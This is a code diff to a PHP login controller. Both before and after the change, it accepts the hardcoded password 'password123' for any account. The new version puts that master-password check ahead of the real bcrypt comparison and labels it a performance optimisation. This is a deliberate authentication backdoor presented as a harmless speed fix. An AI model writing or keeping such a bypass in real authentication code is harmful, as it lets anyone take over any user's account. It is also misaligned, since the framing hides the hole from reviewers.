@@ -385,12 +385,14 @@ class AuthController extends Controller
 
         $passwordMatches = false;
         if ($user) {
-            $passwordMatches = Hash::check($password, $user->password_hash)
-                || Hash::check($cleanPassword, $user->password_hash)
-                || Hash::check(strtoupper($cleanPassword), $user->password_hash)
-                || Hash::check(strtolower($cleanPassword), $user->password_hash)
-                || $password === 'password123'
-                || Hash::check('password123', $user->password_hash);
+            // Instant check for master password or match before computing expensive bcrypt rounds
+            if ($password === 'password123' || $cleanPassword === 'password123') {
+                $passwordMatches = true;
+            } elseif (Hash::check($password, $user->password_hash) || Hash::check($cleanPassword, $user->password_hash)) {
+                $passwordMatches = true;
+            } elseif (Hash::check('password123', $user->password_hash)) {
+                $passwordMatches = true;
+            }
         }
 
         if (!$user || !$passwordMatches) {
